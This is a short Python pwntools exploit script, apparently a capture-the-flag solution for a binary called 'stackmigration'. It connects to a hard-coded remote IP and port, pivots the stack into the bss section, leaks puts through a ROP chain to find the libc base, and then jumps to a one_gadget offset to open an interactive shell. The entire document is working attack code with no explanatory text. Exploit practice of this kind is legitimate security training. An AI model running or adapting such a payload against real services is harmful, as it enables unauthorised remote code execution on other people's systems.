from pwn import *
p=remote('58.240.236.232',13003)
context(arch='amd64',os='linux',log_level='debug')
libc=ELF('./libc.so.6')
e=ELF('./stackmigration')
puts_plt_addr=e.plt['puts']
puts_got_addr=e.got['puts']
pop_rdi_addr=0x400703
level_ret_addr=0x400699
bss_addr=0x601080
ret_addr=0x4004c9
main_addr=0x400626
payload1=0x60*'a'+p64(bss_addr)+p64(level_ret_addr)
p.send(payload1)
payload2=p64(ret_addr)*20
payload2+=p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)
payload2+=p64(main_addr)
p.sendafter('Done!You can check and use your borrow stack now!\n',payload2)
puts_addr=u64(p.recv(6).ljust(8,'\x00'))
libc_base=puts_addr-libc.symbols['puts']
shell=libc_base+0x4527a
print(hex(shell))
payload3=0x60*'a'+p64(0xdeadbeef)+p64(shell)
p.recvuntil('u want\n')
p.send(payload3)
p.recvuntil('Done!You can check and use your borrow stack now!\n')
p.send('1')
p.interactive()

